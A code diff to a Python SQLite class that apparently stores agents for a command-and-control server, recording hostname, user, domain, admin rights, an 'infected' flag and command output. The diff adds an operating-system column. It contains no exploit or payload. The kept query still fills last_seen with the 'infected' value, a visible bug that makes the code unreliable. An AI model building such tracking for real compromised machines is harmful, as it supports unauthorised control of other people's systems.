@@ -15,9 +15,9 @@ class AgentDatabase:
         conn = sqlite3.connect(self.db_path)
         cursor = conn.cursor()
         cursor.execute('''
-            REPLACE INTO agents 
-            (uuid, hostname, username, domain, admin, pid, infected, last_seen) 
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+            REPLACE INTO agents
+            (uuid, hostname, username, domain, admin, pid, infected, last_seen, os)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
         ''', (
             agent_data['uuid'],
             agent_data['hostname'],
@@ -26,7 +26,8 @@ class AgentDatabase:
             agent_data['admin'],
             agent_data['pid'],
             agent_data['infected'],
-            agent_data['infected']
+            agent_data['infected'],
+            agent_data.get('os', '')
         ))
         conn.commit()
         conn.close()
@@ -72,7 +73,7 @@ class AgentDatabase:
         conn = sqlite3.connect(self.db_path)
         cursor = conn.cursor()
         cursor.execute('''
-            SELECT uuid, hostname, username, domain, admin, pid, infected, last_seen, cmdout 
+            SELECT uuid, hostname, username, domain, admin, pid, infected, last_seen, cmdout, os
             FROM agents
         ''')
         agents = []
@@ -86,7 +87,8 @@ class AgentDatabase:
                 "pid": row[5],
                 "infected": row[6],
                 "last_seen": row[7],
-                "cmdout": row[8]
+                "cmdout": row[8],
+                "os": row[9]
             })
         conn.close()
         return agents
@@ -245,7 +247,7 @@ class AgentDatabase:
         conn = sqlite3.connect(self.db_path)
         cursor = conn.cursor()
         cursor.execute('''
-            SELECT uuid, hostname, username, domain, admin, pid, infected, last_seen, cmdout
+            SELECT uuid, hostname, username, domain, admin, pid, infected, last_seen, cmdout, os
             FROM agents WHERE uuid = ?
         ''', (uuid,))
         row = cursor.fetchone()
@@ -260,7 +262,8 @@ class AgentDatabase:
                 "pid": row[5],
                 "infected": row[6],
                 "last_seen": row[7],
-                "cmdout": row[8]
+                "cmdout": row[8],
+                "os": row[9]
             }
         return None
 
